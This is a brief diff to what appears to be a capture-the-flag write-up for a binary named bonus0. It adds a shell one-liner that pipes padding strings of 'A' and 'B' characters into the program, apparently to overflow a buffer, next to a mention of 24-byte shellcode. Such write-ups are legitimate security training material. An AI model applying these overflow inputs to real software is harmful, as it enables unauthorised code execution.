@@ -11,3 +11,7 @@ Here is our shellcode (size 24)
 ```bash
 (python -c 'print ("A" * 20)'; cat) | ./bonus0
 ```
+
+```
+(python -c 'print "A" * 20'; python -c 'print "B" * 17')  | ./bonus0
+```
